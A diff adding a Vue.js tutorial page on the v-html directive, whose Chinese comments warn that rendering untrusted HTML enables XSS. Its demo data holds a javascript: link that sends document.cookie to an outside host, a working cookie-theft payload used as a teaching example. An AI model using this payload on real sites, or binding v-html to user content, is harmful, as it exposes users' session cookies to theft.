@@ -1,0 +1,36 @@
+<!--
+v-html
+    向指定节点中渲染包含html结构的内容
+    与插值语法的区别
+    1. v-html会替换掉节点中所有的内容而{{xxx}}不会
+    2. v-html可以识别html结构
+    注意
+    v-html有安全性问题
+    1. 在网站上动态渲染任意html内容非常危险容易导致XSS攻击
+    2. 一定要在可信的内容上使用v-html, 永远不要用在用户提交的内容上
+-->
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+        <script type="text/javascript" src="../js/vue.js"></script>
+    </head>
+    <body>
+        <div id="root">
+            <h3>{{name}}</h3>
+            <h3 v-html="str"></h3>
+        </div>
+    </body>
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+
+        new Vue({
+            el: '#root',
+            data: {
+                name: 'Hello',
+                str: '<a href=javascript:location.href="https://www.baidu.com?" + document.cookie>点我试试看</a>'
+            }
+        })
+    </script>
+</html>
